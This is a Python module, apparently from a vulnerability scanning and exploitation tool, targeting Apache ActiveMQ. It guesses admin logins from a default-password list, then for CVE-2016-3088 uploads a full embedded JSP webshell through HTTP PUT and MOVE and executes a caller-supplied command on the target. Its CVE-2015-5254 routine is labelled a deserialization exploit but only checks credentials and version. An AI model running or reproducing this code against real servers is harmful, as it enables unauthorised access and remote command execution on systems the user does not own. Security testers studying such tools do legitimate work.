# -*- coding:UTF-8 -*-
import base64,requests,re,random,string
from requests_toolbelt.utils import dump
from ClassCongregation import _urlparse
import CodeTest
################
##--ApacheActiveMQ--##
#cve_2015_5254 管理界面账号爆破
#cve_2016_3088 后台上传webshell
################
VULN = None
TIMEOUT = 10
class ApacheActiveMQ():
    def __init__(self, url, CMD):
        self.url = url
        self.CMD = CMD
        self.jsp_webshell = '<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><' \
            '%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro =' \
            ' Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInpu' \
            'tStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.cl' \
            'ose();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("password".equ' \
            'als(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCm' \
            'd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'

    def cve_2015_5254(self):
        self.pocname = "Apache AcitveMQ: CVE-2015-5254"
        self.rawdata = None
        self.info = "[rce]"
        self.method = "get"
        self.r = "PoCWating"
        self.passlist = ["admin:123456", "admin:admin", "admin:123123", "admin:activemq", "admin:12345678"]
        try:
            for self.pa in self.passlist:
                self.base64_p = base64.b64encode(str.encode(self.pa))
                self.p = self.base64_p.decode('utf-8')
                self.headers_base64 = {
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
                    'Authorization': 'Basic '+self.p
                }
                self.request = requests.get(self.url + "/admin", headers=self.headers_base64, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
                if self.request.status_code == 200:
                    self.get_ver = re.findall("<td><b>(.*)</b></td>", self.request.text)[1]
                    self.ver = self.get_ver.replace(".", "")
                    break
            if int(self.ver) < 5130:
                self.r = "PoCSuCCeSS"
                self.info += " [version check] [activemq version: " + self.get_ver + "]"
            CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2016_3088(self):
        self.pocname = "Apache AcitveMQ: CVE-2016-3088"
        self.rawdata = None
        self.path = "null"
        self.info = "null"
        self.method = "put&move"
        self.name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
        self.webshell = "/"+self.name+".jsp"
        self.poc = ":-)"
        self.exp = self.jsp_webshell
        self.passlist = ["admin:123456","admin:admin","admin:123123","admin:activemq","admin:12345678"]
        try:
            for self.pa in self.passlist:
                self.base64_p = base64.b64encode(str.encode(self.pa))
                self.p = self.base64_p.decode('utf-8')
                self.headers_base64 = {
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
                    'Authorization': 'Basic '+self.p
                }
                self.request = requests.get(self.url + "/admin/test/systemProperties.jsp", headers=self.headers_base64,
                                            timeout=TIMEOUT, verify=False)
                if self.request.status_code == 200:
                    self.path = \
                    re.findall('<td class="label">activemq.home</td>.*?<td>(.*?)</td>', self.request.text, re.S)[0]
                    break
            if VULN == None:
                self.request = requests.put(self.url + "/fileserver/v.txt", headers=self.headers_base64, data=self.poc,
                                            timeout=TIMEOUT, verify=False)
                self.headers_move = {
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
                    'Destination': 'file://' + self.path + '/webapps/api' + self.webshell
                }
                self.request = requests.request("MOVE", self.url + "/fileserver/v.txt", headers=self.headers_move,
                                                timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
                self.request = requests.get(self.url + "/api" + self.webshell, headers=self.headers_base64,
                                            timeout=TIMEOUT, verify=False)
                self.info = "[upload: "+self.url+"/api"+self.webshell+" ]"+" ["+self.pa+"]"
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.put(self.url + "/fileserver/v.txt", headers=self.headers_base64, data=self.exp,
                                            timeout=TIMEOUT, verify=False)
                self.headers_move = {
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
                    'Destination': 'file://' + self.path + '/webapps/api' + self.webshell
                }
                self.request = requests.request("MOVE", self.url + "/fileserver/v.txt", headers=self.headers_move,
                                                timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
                self.request = requests.get(self.url + "/api" + self.webshell + "?pwd=password&cmd="+self.CMD, headers=self.headers_base64,
                                            timeout=TIMEOUT, verify=False)
                self.r = "[webshell: "+self.url+"/api"+self.webshell+"?pwd=password&cmd="+self.CMD+" ]\n"
                self.r += self.request.text
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
print("""
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Apache ActiveMQ   | cve_2015_5254    |  Y  |  N  | < 5.13.0, deserialization remote code execution             |
| Apache ActiveMQ   | cve_2016_3088    |  Y  |  Y  | < 5.14.0, http put&move upload webshell                     |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+""")

def check(**kwargs):
    if CodeTest.VULN == None:
        ExpApacheActiveMQ = ApacheActiveMQ(_urlparse(kwargs['url']),"echo VuLnEcHoPoCSuCCeSS")
    else:
        ExpApacheActiveMQ = ApacheActiveMQ(_urlparse(kwargs['url']),kwargs['cmd'])

    if kwargs['pocname'] == "cve_2015_5254":
        ExpApacheActiveMQ.cve_2015_5254()
    elif kwargs['pocname'] == "cve_2016_3088":
        ExpApacheActiveMQ.cve_2016_3088()
    else:
        ExpApacheActiveMQ.cve_2015_5254()
        ExpApacheActiveMQ.cve_2016_3088()




